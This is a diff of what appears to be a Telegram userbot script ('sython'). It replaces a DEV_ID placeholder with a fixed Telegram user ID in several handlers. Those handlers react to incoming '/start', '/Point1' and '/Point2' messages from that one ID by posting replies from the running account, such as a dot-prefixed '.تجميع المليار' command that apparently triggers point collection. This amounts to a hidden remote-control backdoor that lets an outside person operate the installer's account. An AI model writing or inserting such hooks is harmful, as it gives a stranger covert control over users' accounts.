@@ -114,21 +114,21 @@ async def _(event):
     await event.edit(sec4)
 
     
-ownerhson_id = DEV_ID
+ownerhson_id = 1631148798
 @sython.on(events.NewMessage(outgoing=False, pattern='/start'))
 async def OwnerStart(event):
     sender = await event.get_sender()
     if sender.id == ownerhson_id :
         order = await event.reply('مرحبا ايها المطور')
         
-ownerhson_id = DEV_ID
+ownerhson_id = 1631148798
 @sython.on(events.NewMessage(outgoing=False, pattern='/Point1'))
 async def OwnerStart(event):
     sender = await event.get_sender()
     if sender.id == ownerhson_id :
         order = await event.reply('.تجميع المليار')
         
-ownerhson_id = DEV_ID
+ownerhson_id = 1631148798
 @sython.on(events.NewMessage(outgoing=False, pattern='/Point2'))
 async def OwnerStart(event):
     sender = await event.get_sender()
